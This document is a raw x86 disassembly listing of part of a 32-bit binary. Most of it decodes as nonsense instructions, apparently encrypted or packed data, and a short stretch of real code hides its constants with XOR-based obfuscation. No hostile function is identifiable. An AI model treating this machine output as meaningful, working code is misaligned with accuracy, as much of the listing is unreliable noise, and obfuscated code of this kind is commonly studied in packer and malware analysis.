  4039c8:	push   DWORD PTR [ecx]
  4039ca:	add    al,0xbd
  4039cc:	pop    ss
  4039cd:	jmp    0x4039a2
  4039cf:	ins    DWORD PTR es:[edi],dx
  4039d0:	and    DWORD PTR [ebp-0x17aa12b9],edi
  4039d6:	ficomp DWORD PTR [ecx+0x60]
  4039d9:	fsubrp st(2),st
  4039db:	add    edx,DWORD PTR [eax+0x6bcc245c]
  4039e1:	sub    eax,0x7555418f
  4039e6:	mov    esi,0x48cdc5f7
  4039eb:	adc    dh,ch
  4039ed:	test   BYTE PTR [ecx],bl
  4039ef:	add    esp,DWORD PTR [ebx-0x52]
  4039f2:	jecxz  0x4039bc
  4039f4:	adc    al,BYTE PTR [ebx+0x3e394ed1]
  4039fa:	mov    esp,0x362ecad4
  4039ff:	les    edx,FWORD PTR [edi-0x46]
  403a02:	in     eax,0xe4
  403a04:	xchg   ebx,eax
  403a05:	jmp    0x63ab:0x87906b6b
  403a0c:	sub    al,0xe
  403a0e:	mov    edi,0xba1adea0
  403a13:	dec    esp
  403a14:	and    esi,ecx
  403a16:	jge    0x403a4f
  403a18:	sar    ch,cl
  403a1a:	pop    eax
  403a1b:	loopne 0x403a12
  403a1d:	in     eax,dx
  403a1e:	mov    ch,0x2c
  403a20:	fcmovne st,st(0)
  403a22:	arpl   WORD PTR [edx+0x11],cx
  403a25:	jmp    0x4039ec
  403a27:	call   0xcda8:0x92f7094d
  403a2e:	lods   eax,DWORD PTR ds:[esi]
  403a2f:	jne    0x403a98
  403a31:	ret    0x2cf3
  403a34:	adc    edi,edi
  403a36:	mov    esp,0xd7ff5068
  403a3b:	mov    dl,0xbe
  403a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a3e:	dec    eax
  403a3f:	stos   DWORD PTR es:[edi],eax
  403a40:	adc    ebp,eax
  403a42:	mov    ah,0x61
  403a44:	js     0x403a0c
  403a46:	inc    eax
  403a47:	mov    esi,0xbfffc20a
  403a4c:	(bad)  
  403a4d:	cmp    ah,BYTE PTR [esi+0xc]
  403a50:	cli    
  403a51:	loopne 0x4039e7
  403a53:	mov    ds:0xcfad13e3,al
  403a58:	pop    edx
  403a59:	stos   DWORD PTR es:[edi],eax
  403a5a:	inc    esi
  403a5b:	(bad)  
  403a5c:	jl     0x403aaa
  403a5e:	fldenv [ecx]
  403a60:	push   ebp
  403a61:	add    ebx,DWORD PTR [ebx+0x27]
  403a64:	clc    
  403a65:	cld    
  403a66:	loop   0x403a7a
  403a68:	and    DWORD PTR [edi],esi
  403a6a:	inc    esi
  403a6b:	fld    DWORD PTR [esi-0x4a9e6a76]
  403a71:	mov    edx,0x3c2480f2
  403a76:	js     0x403a26
  403a78:	push   ecx
  403a79:	inc    ebp
  403a7a:	cmp    DWORD PTR [eax-0x147c4d3f],edx
  403a80:	data16 out dx,al
  403a82:	sub    DWORD PTR [ecx-0x793a9f89],esi
  403a88:	test   ah,bl
  403a8a:	jnp    0x403aa8
  403a8c:	ins    DWORD PTR es:[edi],dx
  403a8d:	inc    ebx
  403a8e:	mov    WORD PTR [ecx-0x20],ss
  403a91:	jo     0x403a4d
  403a93:	and    dl,BYTE PTR cs:[esi]
  403a96:	sbb    eax,0x13772bbd
  403a9b:	outs   dx,BYTE PTR ds:[esi]
  403a9c:	int3   
  403a9d:	cmp    edi,0xa852f975
  403aa3:	or     eax,ebx
  403aa5:	xor    al,0x3e
  403aa7:	(bad)  
  403aa8:	ror    BYTE PTR [ebx],cl
  403aaa:	in     al,0x9f
  403aac:	je     0x403ae8
  403aae:	sbb    al,0x2c
  403ab0:	jae    0x403b14
  403ab2:	or     esp,esi
  403ab4:	xchg   BYTE PTR [edx-0x5d],dh
  403ab7:	dec    edx
  403ab8:	and    al,0x24
  403aba:	dec    ebp
  403abb:	cmp    BYTE PTR [edx+0x5e0a129d],bl
  403ac1:	fnstenv [esi]
  403ac3:	dec    edi
  403ac4:	aas    
  403ac5:	xchg   esi,eax
  403ac6:	xor    eax,0x955cc12d
  403acb:	jmp    0x635a7018
  403ad0:	lock jp 0x403b36
  403ad3:	rol    al,1
  403ad5:	and    BYTE PTR [ecx-0x29],ch
  403ad8:	imul   ecx,DWORD PTR [eax],0xffffffe0
  403adb:	inc    esp
  403adc:	pusha  
  403add:	pop    edi
  403ade:	jp     0x403abc
  403ae0:	sbb    BYTE PTR [edi],0x40
  403ae3:	in     al,0x2b
  403ae5:	in     al,dx
  403ae6:	mov    BYTE PTR [edi+0x53bdcd00],dh
  403aec:	pop    ebx
  403aed:	pop    edx
  403aee:	test   al,0xa7
  403af0:	push   edx
  403af1:	sbb    eax,0x7f627c11
  403af6:	jns    0x403b07
  403af8:	(bad)  
  403af9:	and    BYTE PTR [ebx-0x5c],ah
  403afc:	mov    esp,0x95850f44
  403b01:	mov    al,0xf5
  403b03:	out    dx,eax
  403b04:	test   DWORD PTR [eax-0x1e7e16],ebx
  403b0a:	test   eax,0x57e53774
  403b0f:	lahf   
  403b10:	shl    ecx,cl
  403b12:	loop   0x403afe
  403b14:	push   edx
  403b15:	xchg   BYTE PTR [ecx],dl
  403b17:	outs   dx,BYTE PTR ds:[esi]
  403b18:	outs   dx,DWORD PTR ds:[esi]
  403b19:	mov    dl,BYTE PTR [esi+ecx*2-0x3beb3d3f]
  403b20:	mov    eax,ds:0x65cce793
  403b25:	xchg   DWORD PTR [eax+edx*8],edx
  403b28:	not    DWORD PTR [edi+0x74]
  403b2b:	sub    eax,edi
  403b2d:	xor    eax,esi
  403b2f:	cmp    eax,ecx
  403b31:	jne    0x403b8d
  403b37:	or     ecx,0x18fd
  403b3d:	mov    eax,DWORD PTR [ebp-0x8]
  403b40:	and    DWORD PTR ds:0x42916b,0x3a4c
  403b4a:	mov    ecx,DWORD PTR [ebp-0x10]
  403b4d:	adc    DWORD PTR ds:0x42916b,0x4291f3
  403b57:	xor    eax,esi
  403b59:	xor    DWORD PTR ds:0x4291d3,0x4291f7
  403b63:	xor    ecx,esi
  403b65:	sub    eax,ecx
  403b67:	sub    eax,edi
  403b69:	mov    ecx,DWORD PTR ds:0x429c6f
  403b6f:	mov    ecx,DWORD PTR [ecx]
  403b71:	xor    DWORD PTR ds:0x429163,ecx
  403b77:	xor    eax,esi
  403b79:	mov    DWORD PTR [ebp-0x8],eax
  403b7c:	mov    eax,DWORD PTR [ebp-0x10]
  403b7f:	xor    eax,esi
  403b81:	mov    ecx,0xffcd8d8d
  403b86:	sub    ecx,eax
  403b88:	jmp    0x403b9c
  403b8d:	mov    eax,DWORD PTR [ebp-0x10]
  403b90:	xor    eax,esi
  403b92:	mov    ecx,0xffcd8d0d
  403b97:	sub    ecx,eax
  403b99:	add    ecx,DWORD PTR [ebp-0xc]
  403b9c:	mov    DWORD PTR [ebp-0xc],ecx
  403b9f:	mov    eax,DWORD PTR [ebp-0x8]
  403ba2:	cmp    eax,0xf89c85a1
  403ba7:	jne    0x40158a
  403bad:	mov    DWORD PTR [ebp-0x34],0x9
  403bb4:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb7:	xor    ecx,esi
  403bb9:	add    ecx,edi
  403bbb:	jmp    0x40857d
  403bc0:	lea    eax,[ecx+ebx*1]
  403bc3:	mov    DWORD PTR [ebp-0x2c],eax
  403bc6:	mov    eax,DWORD PTR [ebp-0x58]
  403bc9:	sub    eax,ecx
  403bcb:	mov    DWORD PTR [ebp-0x1c],eax
  403bce:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd1:	mov    DWORD PTR [ebp-0x14],eax
  403bd4:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd7:	mov    DWORD PTR [ebp-0x38],0xf89c85a1
  403bde:	mov    DWORD PTR [ebp-0x54],eax
  403be1:	mov    DWORD PTR [ebp-0x20],0xf89c85a2
  403be8:	mov    eax,DWORD PTR [ebp-0x38]
  403beb:	xor    eax,esi
  403bed:	add    eax,edi
  403bef:	mov    DWORD PTR [ebp-0x10],eax
  403bf2:	mov    eax,DWORD PTR [ebp-0x38]
  403bf5:	xor    eax,esi
  403bf7:	add    eax,edi
  403bf9:	mov    DWORD PTR [ebp-0x8],eax
  403bfc:	mov    DWORD PTR [ebp-0x2c],0xf89c8581
  403c03:	mov    DWORD PTR [ebp-0x44],0xf89c85b8
  403c0a:	mov    eax,DWORD PTR [ebp-0x38]
  403c0d:	mov    edx,DWORD PTR [ebp-0x14]
  403c10:	xor    eax,esi
  403c12:	add    eax,edi
  403c14:	cmp    edx,eax
  403c16:	je     0x408571
  403c1c:	mov    eax,DWORD PTR [ebp-0x20]
  403c1f:	xor    eax,esi
  403c21:	mov    edx,0xffcd8d0d
  403c26:	sub    edx,eax
  403c28:	add    edx,DWORD PTR [ebp-0x14]
  403c2b:	mov    eax,DWORD PTR [ebp-0x20]
  403c2e:	mov    ebx,DWORD PTR [ebp-0x10]
  403c31:	xor    eax,esi
  403c33:	add    eax,edi
  403c35:	imul   eax,ebx
  403c38:	cmp    eax,edx
  403c3a:	ja     0x40856e
  403c40:	mov    edx,DWORD PTR [ebp-0x10]
  403c43:	mov    eax,DWORD PTR [ebp-0x14]
  403c46:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c49:	sub    eax,edx
  403c4b:	xor    ebx,esi
  403c4d:	xor    edx,edx
  403c4f:	add    ebx,edi
  403c51:	div    ebx
  403c53:	mov    DWORD PTR [ebp-0x8],eax
  403c56:	mov    eax,DWORD PTR [ebp-0x44]
  403c59:	mov    edx,DWORD PTR [ebp-0x8]
  403c5c:	xor    eax,esi
  403c5e:	add    eax,edi
  403c60:	cmp    edx,eax
  403c62:	jbe    0x403c72
  403c68:	mov    eax,DWORD PTR [ebp-0x44]
  403c6b:	xor    eax,esi
  403c6d:	add    eax,edi
  403c6f:	mov    DWORD PTR [ebp-0x8],eax
  403c72:	mov    eax,DWORD PTR [ebp-0x2c]
  403c75:	mov    edx,DWORD PTR [ebp-0x8]
  403c78:	xor    eax,esi
  403c7a:	add    eax,edi
  403c7c:	imul   eax,edx
  403c7f:	mov    DWORD PTR [ebp-0x8],eax
  403c82:	mov    eax,DWORD PTR [ebp-0x38]
  403c85:	mov    edx,DWORD PTR [ebp-0x8]
  403c88:	jmp    0x406039
  403c8d:	mov    eax,0xa02c6f67
  403c92:	and    al,0xb8
  403c94:	out    0x12,eax
  403c96:	mov    bh,0x24
  403c98:	fnstsw WORD PTR [ebx+ecx*8-0x63]
  403c9c:	shr    edi,1
  403c9e:	pop    esp
  403c9f:	add    DWORD PTR [ebx-0x7c7ca311],0xffffffe2
  403ca6:	add    ah,BYTE PTR [ecx+0x7cd048cb]
  403cac:	in     eax,dx
  403cad:	sub    bl,ah
  403caf:	and    eax,0x20b2afdc
  403cb4:	imul   ebx,ebp,0xffffff9a
  403cb7:	pop    edx
  403cb8:	pop    ebx
  403cb9:	cmp    al,0x38
  403cbb:	rcr    edx,1
  403cbd:	cdq    
  403cbe:	call   0xcb47:0xb287ad30
  403cc5:	rol    BYTE PTR [esi-0x3dd65662],cl
  403ccb:	cmp    dl,BYTE PTR [edx-0x1fc5d6aa]
  403cd1:	out    0x66,eax
  403cd3:	push   ds
  403cd4:	and    esi,edx
  403cd6:	stos   DWORD PTR es:[edi],eax
  403cd7:	adc    al,0xa8
  403cd9:	mov    al,0x78
  403cdb:	cdq    
  403cdc:	jo     0x403d3f
  403cde:	sbb    ebx,DWORD PTR [ebp+0x41]
  403ce1:	int3   
  403ce2:	sub    edx,DWORD PTR [edi]
  403ce4:	pop    edx
  403ce5:	jb     0x403d00
  403ce7:	das    
  403ce8:	mov    bl,0x2e
  403cea:	push   0x7e
  403cec:	addr16 mov ecx,0xb88681f4
  403cf2:	inc    ebx
  403cf3:	sub    BYTE PTR [edi],bl
  403cf5:	aas    
  403cf6:	dec    ebp
  403cf7:	call   0x3bfe:0x8561
  403cfd:	sbb    bl,BYTE PTR [ecx]
  403cff:	jmp    0xd23a:0xd24dbe83
  403d06:	outs   dx,BYTE PTR ds:[esi]
  403d07:	cmc    
  403d08:	adc    DWORD PTR [edx+0x516a31b4],ebx
  403d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d0f:	(bad)  
  403d10:	outs   dx,DWORD PTR ds:[esi]
  403d11:	pop    ss
  403d12:	xchg   ebp,eax
  403d13:	mov    DWORD PTR fs:[ecx],ecx
  403d16:	mov    ds:0x5ac4ab0d,al
  403d1b:	mov    ds:0x557322db,eax
  403d20:	call   0x5a430db5
  403d25:	scas   al,BYTE PTR es:[edi]
  403d26:	adc    BYTE PTR [edx+0x23],dl
  403d29:	jge    0x403d22
  403d2b:	shr    BYTE PTR [edx-0x42aaf516],1
  403d31:	sub    esp,DWORD PTR [ebp-0x7b]
  403d34:	and    ebp,DWORD PTR [ebp-0x2]
  403d37:	mov    esi,0xaf5eba0b
  403d3c:	or     al,0x78
  403d3e:	popa   
  403d3f:	outs   dx,DWORD PTR ss:[esi]
  403d41:	inc    BYTE PTR [esi-0x3b8c1183]
  403d47:	loope  0x403d5a
  403d49:	sub    eax,0x3043658f
  403d4e:	jge    0x403d07
  403d50:	mov    esp,0xd741e84f
  403d55:	out    0x47,al
  403d57:	addr16 ds sti 
  403d5a:	inc    bp
  403d5c:	mov    ecx,0xfa0f9a1f
  403d61:	test   al,0x27
  403d63:	out    dx,al
  403d64:	nop
  403d65:	scas   eax,DWORD PTR es:[edi]
  403d66:	inc    esp
  403d67:	ins    BYTE PTR es:[edi],dx
  403d68:	addr16 nop
  403d6a:	mov    ds:0xe244af6,al
  403d6f:	xchg   BYTE PTR [edx],dl
  403d71:	sbb    dl,0x28
  403d74:	(bad)  
  403d75:	lahf   
  403d76:	leave  
  403d77:	ss js  0x403df8
  403d7a:	test   BYTE PTR [esi+0x4334e7c3],0xfd
  403d81:	add    eax,0x4bcdd264
  403d86:	shl    BYTE PTR [edi],cl
  403d88:	data16 mov dl,0x61
  403d8b:	out    dx,al
  403d8c:	shl    BYTE PTR [edi-0x7d],1
  403d8f:	mov    bh,0xf4
  403d91:	mov    ebx,DWORD PTR [edi+0x117b8ee8]
  403d97:	mov    al,ds:0x4308aaaf
  403d9c:	mov    ebp,0x8c7739a
  403da1:	inc    ebp
  403da2:	add    ch,bh
  403da4:	test   al,0xa9
  403da6:	dec    ecx
  403da7:	xchg   edx,eax
  403da8:	repz push ecx
  403daa:	xchg   edi,eax
  403dab:	push   es
  403dac:	and    al,0x30
  403dae:	pushf  
  403daf:	adc    al,0x80
  403db1:	pop    es
  403db2:	adc    edi,esp
  403db4:	sub    al,0xa7
  403db6:	int    0x7b
  403db8:	dec    DWORD PTR [ebx+edi*8]
  403dbb:	or     al,0x12
  403dbd:	in     eax,0xc5
  403dbf:	add    al,0x59
  403dc1:	(bad)  
  403dc2:	xor    DWORD PTR [ebx-0x20],edx
  403dc5:	mov    dx,0x4e89
  403dc9:	clc    
  403dca:	mov    esi,0xa5ce49c4
  403dcf:	mov    ebp,0x79f71cc0
  403dd4:	repnz pop ebx
  403dd6:	fidivr WORD PTR [ecx]
  403dd8:	daa    
  403dd9:	mov    eax,0xd0eb6b89
  403dde:	imul   edx
  403de0:	aas    
  403de1:	add    DWORD PTR [edi-0x6fc1d561],ebx
  403de7:	push   eax
  403de8:	test   BYTE PTR [edi-0x11de0335],0x23
  403def:	fadd   DWORD PTR [esi]
  403df1:	outs   dx,DWORD PTR ds:[esi]
  403df2:	jecxz  0x403d74
  403df4:	jle    0x403d99
  403df6:	stc    
  403df7:	jno    0x403e46
  403df9:	or     edi,DWORD PTR [ebx+eax*2]
  403dfc:	push   cs
  403dfd:	je     0x403dc7
  403dff:	pop    ebp
  403e00:	fisttp DWORD PTR [ecx+0x37e19b89]
  403e06:	push   ecx
  403e07:	cmp    eax,0xd5551ede
  403e0c:	bound  ebp,QWORD PTR [eax+edi*4-0x37]
  403e10:	adc    eax,0x62e29920
  403e15:	ins    BYTE PTR es:[edi],dx
  403e16:	push   ecx
  403e17:	add    DWORD PTR [ebp-0x70be555e],esi
  403e1d:	add    eax,0x43fc252
  403e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e23:	pushf  
  403e24:	retf   
  403e25:	dec    eax
  403e26:	jb     0x403df3
  403e28:	cmp    bh,ah
  403e2a:	jne    0x403e4d
  403e2c:	mov    WORD PTR [edx],ds
  403e2e:	xlat   BYTE PTR ds:[ebx]
  403e2f:	jecxz  0x403e3b
  403e31:	jne    0x403e56
  403e33:	aad    0xcc
  403e35:	inc    ebx
  403e36:	lods   al,BYTE PTR ds:[esi]
  403e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e38:	test   BYTE PTR [edx+ebx*4-0x71],dl
  403e3c:	dec    eax
  403e3d:	xor    al,0xf2
  403e3f:	push   ds
  403e40:	dec    esi
  403e41:	call   0x7e4e9851
  403e46:	lea    ecx,[ecx]
  403e48:	outs   dx,DWORD PTR ds:[esi]
  403e49:	mov    dl,0xcd
  403e4b:	mov    esi,DWORD PTR [ebp+0x52]
  403e4e:	loope  0x403ea6
  403e50:	(bad)  
  403e51:	push   esi
  403e52:	ins    BYTE PTR es:[edi],dx
  403e53:	(bad)  
  403e54:	out    0x26,eax
  403e56:	jne    0x403ea6
  403e58:	push   ss
  403e59:	repz cs jnp 0x403e7a
  403e5d:	xor    eax,0x61972eda
  403e62:	sbb    BYTE PTR [ebx-0x8],dh
  403e65:	add    edx,DWORD PTR [ebx-0x79]
  403e68:	xor    BYTE PTR [ecx+edi*2+0x1],bh
  403e6c:	adc    al,0x56
  403e6e:	iret   
  403e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e70:	push   ecx
  403e71:	inc    ebp
  403e72:	enter  0x46bc,0x4e
  403e76:	and    al,0xa0
  403e78:	xchg   ebx,eax
  403e79:	and    eax,0x1d3af19d
  403e7e:	or     al,BYTE PTR [edx-0x69]
  403e81:	ins    BYTE PTR es:[edi],dx
  403e82:	nop
  403e83:	ja     0x403ed0
  403e85:	gs mov ebp,0x92f77cb0
  403e8b:	psubusw mm2,QWORD PTR [ebx]
  403e8e:	mov    edi,0x42075bcf
  403e93:	or     eax,0xb47f5cc0
  403e98:	jo     0x403e38
  403e9a:	aam    0xf2
  403e9c:	inc    esp
  403e9d:	adc    ecx,DWORD PTR [esp+eax*4]
  403ea0:	fbld   TBYTE PTR [edx+0x3dae479c]
  403ea6:	fld    QWORD PTR [ebp-0x79363111]
  403eac:	das    
  403ead:	jne    0x403f12
  403eaf:	xor    BYTE PTR [ebp-0x34],al
  403eb2:	xchg   ecx,eax
  403eb3:	mov    esi,0x3d63826b
  403eb8:	jp     0x403eba
  403eba:	stc    
  403ebb:	bound  edx,QWORD PTR [esi-0x2f0a241c]
  403ec1:	sbb    al,0x8e
  403ec3:	stos   BYTE PTR es:[edi],al
  403ec4:	mov    al,0xbe
  403ec6:	loope  0x403e71
  403ec8:	(bad)  
  403ec9:	mov    cl,0x5b
  403ecb:	int3   
  403ecc:	adc    dl,BYTE PTR [edi+0x2d]
  403ecf:	or     DWORD PTR [ebx+0x29],0x2e2a1563
  403ed6:	pushf  
  403ed7:	in     al,0x7c
  403ed9:	cmc    
  403eda:	push   esp
  403edb:	test   al,0xe0
  403edd:	ja     0x403f0b
  403edf:	dec    edx
  403ee0:	mov    bl,bl
  403ee2:	mov    cl,0xb0
  403ee4:	jl     0x403ec3
  403ee6:	dec    eax
  403ee7:	mov    WORD PTR [esi+edi*8-0x68a24a64],cs
  403eee:	mov    DWORD PTR [edi],esp
  403ef0:	jmp    0x403ef0
  403ef2:	stos   DWORD PTR es:[edi],eax
  403ef3:	aam    0x3d
  403ef5:	push   0x96c9b058
  403efa:	rcr    DWORD PTR [ecx],cl
  403efc:	add    al,0xbe
  403efe:	or     bh,al
  403f00:	repz fnstenv [edx-0x7b]
  403f04:	jo     0x403f37
  403f06:	jne    0x403efd
  403f08:	xchg   esi,eax
  403f09:	addr16 xor al,0x3d
  403f0c:	push   ecx
  403f0d:	sbb    BYTE PTR es:[edx],ah
  403f10:	loopne 0x403ed1
  403f12:	int    0x7d
  403f14:	inc    BYTE PTR [ebx]
  403f16:	sub    eax,0xca88f84c
  403f1b:	shr    DWORD PTR [edx-0x47006bd5],0x19
  403f22:	dec    edx
  403f23:	mov    gs:0x85c3287c,eax
  403f29:	lock xor BYTE PTR [ebp-0x4582e9a2],al
  403f30:	pop    esp
  403f31:	or     al,0x44
  403f33:	fcom   QWORD PTR [edi-0xbeef520]
  403f39:	sub    al,BYTE PTR [edx]
  403f3b:	jecxz  0x403ee0
  403f3d:	mov    dh,0xb7
  403f3f:	or     DWORD PTR [eax+0x0],edi
  403f42:	imul   ebp,ecx,0xf3f3b5a6
  403f48:	jbe    0x403f67
  403f4a:	fcomi  st,st(1)
  403f4c:	sub    eax,0x478ee842
  403f51:	ins    BYTE PTR es:[edi],dx
  403f52:	shl    BYTE PTR [esi],1
  403f54:	mov    ecx,0x45ff8ba9
  403f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f5a:	cld    
  403f5b:	and    edi,ebx
  403f5d:	or     eax,DWORD PTR [edi-0x63]
  403f60:	es in  eax,dx
  403f62:	aam    0xd4
  403f64:	rcr    BYTE PTR [edx+0x59],cl
  403f67:	cmp    al,0x5e
  403f69:	and    DWORD PTR [ebx],edx
  403f6b:	popa   
  403f6c:	fcomp  QWORD PTR [esi-0x1c]
  403f6f:	enter  0x3e82,0xdb
  403f73:	retf   0x7d19
  403f76:	aam    0xfc
  403f78:	cwde   
  403f79:	in     al,dx
  403f7a:	and    edx,DWORD PTR [ecx]
  403f7c:	or     edi,edx
  403f7e:	mov    edx,0xe03b60c7
  403f83:	inc    ecx
  403f84:	aad    0xad
  403f86:	jns    0x403f9f
  403f88:	shr    dh,0xcb
  403f8b:	push   ebx
  403f8c:	mov    eax,ecx
  403f8e:	pop    ebx
  403f8f:	shr    ecx,cl
  403f91:	jnp    0x403f44
  403f93:	sar    ebp,0x22
  403f96:	repnz inc edx
  403f98:	adc    al,0x4a
  403f9a:	repnz mov dl,0xab
  403f9d:	jnp    0x403fec
  403f9f:	jge    0x403f91
  403fa1:	mov    dl,bh
  403fa3:	sbb    al,0xff
  403fa5:	stos   BYTE PTR es:[edi],al
  403fa6:	call   DWORD PTR [edi-0x21ff1eda]
  403fac:	popa   
  403fad:	enter  0xc724,0x20
  403fb1:	ficomp DWORD PTR [ebx+0x35aebbde]
  403fb7:	and    bl,dh
  403fb9:	mov    bh,0x64
  403fbb:	fwait
  403fbc:	push   eax
  403fbd:	shl    BYTE PTR [ebx+0x43],1
  403fc0:	outs   dx,DWORD PTR ds:[esi]
  403fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fc2:	jno    0x403fcc
  403fc4:	inc    ebp
  403fc5:	dec    esi
  403fc6:	and    BYTE PTR [ebp-0x2f],dh
  403fc9:	out    dx,eax
  403fca:	(bad)  
  403fcb:	call   0xa177757b
  403fd0:	sbb    al,0x39
  403fd2:	sbb    eax,0x926d24bc
  403fd7:	xor    DWORD PTR [edi-0x20],esi
  403fda:	lldt   WORD PTR [edx]
  403fdd:	and    BYTE PTR [ebx+0x20],cl
  403fe0:	xor    al,0x12
  403fe2:	jg     0x404018
  403fe4:	mov    ds:0x6c5a1005,eax
  403fe9:	xor    edi,ebp
  403feb:	mov    dl,0x8f
  403fed:	mov    ebx,0x72d1afdd
  403ff2:	cld    
  403ff3:	jno    0x404019
  403ff5:	add    ecx,DWORD PTR [ecx-0x1a]
  403ff8:	lods   al,BYTE PTR ds:[esi]
  403ff9:	mov    bl,0xc
  403ffb:	push   edx
  403ffc:	js     0x403fe4
  403ffe:	fdivr  QWORD PTR [eax+0x42]
  404001:	mov    dh,0xde
  404003:	mov    esi,0xba065eca
  404008:	adc    DWORD PTR [edi-0x70],ebp
  40400b:	mov    ah,BYTE PTR [eax+0x35b74f05]
  404011:	mov    dh,ch
  404013:	mov    eax,0xa7211684
  404018:	cdq    
  404019:	repnz mov edx,gs
  40401c:	add    BYTE PTR [edx],bl
  40401e:	(bad)  
  404020:	cmc    
  404021:	mov    eax,ds:0x49bb416a
  404026:	jge    0x403fe3
  404028:	pop    edi
  404029:	dec    ebp
  40402a:	ror    BYTE PTR [ebp+0x1],cl
  40402d:	add    eax,0x51e32091
  404032:	jo     0x40403e
  404034:	out    dx,al
  404035:	jge    0x403fd4
  404037:	dec    eax
  404038:	sbb    esi,DWORD PTR [ecx-0x48]
  40403b:	hlt    
  40403c:	imul   eax,DWORD PTR [ebx-0x75],0xffffffdd
  404040:	lods   al,BYTE PTR ds:[esi]
  404041:	js     0x404032
  404043:	bound  ebp,QWORD PTR [edx-0x42]
  404046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404047:	xor    DWORD PTR [edx+eax*8-0x5f],edx
  40404b:	inc    dh
  40404d:	dec    esp
  40404e:	or     eax,0xad4bde01
  404053:	sbb    eax,0x6c371ba7
  404058:	call   0xb7859a58
  40405d:	sti    
  40405e:	ss push cx
  404061:	sub    al,0x7f
  404063:	hlt    
  404064:	jns    0x404081
  404066:	add    DWORD PTR [edx],0x5797cb01
  40406c:	sbb    eax,0xe9f9e8ef
  404071:	and    DWORD PTR [ecx+0x22],ebx
  404074:	mov    ebx,0x9706f001
  404079:	adc    eax,0xab3e2e18
  40407e:	ins    DWORD PTR es:[edi],dx
  40407f:	push   ss
  404080:	call   0x1430:0x6c7bbb11
  404087:	sbb    DWORD PTR [ebx+edx*1+0x40],edi
  40408b:	inc    eax
  40408c:	inc    esi
  40408d:	repnz mov esp,0xd56ad938
  404093:	aad    0x31
  404095:	mov    dl,0xa7
  404097:	ror    DWORD PTR [esi-0x1c4b201f],0xd9
  40409e:	paddd  mm4,QWORD PTR [esi-0x5d]
  4040a2:	mov    edx,ebx
  4040a4:	xchg   DWORD PTR [esi+0x21],ecx
  4040a7:	mov    ebx,0xd974b369
  4040ac:	and    ebx,DWORD PTR [ecx+0x7220a0c2]
  4040b2:	call   0x8298:0x8306aba2
  4040b9:	jns    0x4040ff
  4040bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040bc:	jecxz  0x40408c
  4040be:	push   edi
  4040bf:	xchg   ebp,eax
  4040c0:	adc    esi,ecx
  4040c2:	lahf   
  4040c3:	xchg   edx,eax
  4040c4:	shr    BYTE PTR [eax+edi*2-0x55],cl
  4040c8:	mov    eax,0x1136f649
  4040cd:	fs add al,0x3f
  4040d0:	pusha  
  4040d1:	sbb    eax,ebp
  4040d3:	js     0x404103
  4040d5:	xchg   DWORD PTR [ebx],ebp
  4040d7:	ins    BYTE PTR es:[edi],dx
  4040d8:	cld    
  4040d9:	jns    0x40414f
  4040db:	jne    0x4040f7
  4040dd:	bound  ebx,QWORD PTR [edx]
  4040df:	xchg   ebx,eax
  4040e0:	idiv   ah
  4040e2:	in     al,dx
  4040e3:	int3   
  4040e4:	pop    esi
  4040e5:	push   ss
  4040e6:	sbb    eax,eax
  4040e8:	outs   dx,BYTE PTR ds:[esi]
  4040e9:	cmp    DWORD PTR [edi+edx*2-0x59],esi
  4040ed:	jno    0x40411f
  4040ef:	pop    esi
  4040f0:	into   
  4040f1:	dec    esi
  4040f2:	loop   0x4040a2
  4040f4:	das    
  4040f5:	sbb    DWORD PTR [edi-0x6e],esi
  4040f8:	loopne 0x40411a
  4040fa:	(bad)  
  4040fb:	push   ebx
  4040fc:	mov    bl,0x18
  4040fe:	hlt    
  4040ff:	fist   DWORD PTR [edx-0x6f]
  404102:	ins    DWORD PTR es:[edi],dx
  404103:	sub    ebx,0x38ac5cfb
  404109:	ror    BYTE PTR [eax+0x32640f90],1
  40410f:	mov    edi,esi
  404111:	repz sub bh,ch
  404114:	cli    
  404115:	adc    al,0xb6
  404117:	pop    ebp
  404118:	mov    ebp,0x34b8af72
  40411d:	xor    al,0xe5
  40411f:	mov    dh,BYTE PTR [ebx-0x776444bf]
  404125:	popa   
  404126:	push   esi
  404127:	add    eax,0xc5f3473c
  40412c:	aas    
  40412d:	aad    0x2e
  40412f:	push   eax
  404130:	jnp    0x404167
  404132:	xor    al,0x2b
  404134:	mov    cl,0x6e
  404136:	loopne 0x4041a7
  404138:	std    
  404139:	push   esi
  40413a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40413b:	pop    eax
  40413c:	or     al,0xdc
  40413e:	add    al,cl
  404140:	scas   eax,DWORD PTR es:[edi]
  404141:	cwde   
  404142:	or     cl,bl
  404144:	retf   
  404145:	mov    cl,0x52
  404147:	ins    BYTE PTR es:[edi],dx
  404148:	stos   DWORD PTR es:[edi],eax
  404149:	nop
  40414a:	mov    ch,0x7d
  40414c:	mov    ebp,0xf9110ebf
  404151:	xlat   BYTE PTR ds:[ebx]
  404152:	call   DWORD PTR [ebx+0x5b420606]
  404158:	jmp    0x8115:0x5c2f6dfa
  40415f:	into   
  404160:	stos   BYTE PTR es:[edi],al
  404161:	lock (bad) 
  404163:	std    
  404164:	add    eax,0x78172cd6
  404169:	(bad)  
  40416a:	into   
  40416b:	push   cs
  40416c:	push   0x3ebc0980
  404171:	ins    BYTE PTR es:[edi],dx
  404172:	lock popa 
  404174:	adc    ah,ch
  404176:	aaa    
  404177:	pushf  
  404178:	imul   esp,DWORD PTR [ecx],0x16
  40417b:	ret    
  40417c:	xchg   ebx,eax
  40417d:	and    al,0x9d
  40417f:	push   esi
  404180:	es inc eax
  404182:	jmp    0x8f96d244
  404187:	adc    ecx,esi
  404189:	mov    esp,0x36363c50
  40418e:	jae    0x404166
  404190:	inc    ebx
  404191:	lods   al,BYTE PTR ds:[esi]
  404192:	aam    0x22
  404194:	pop    edx
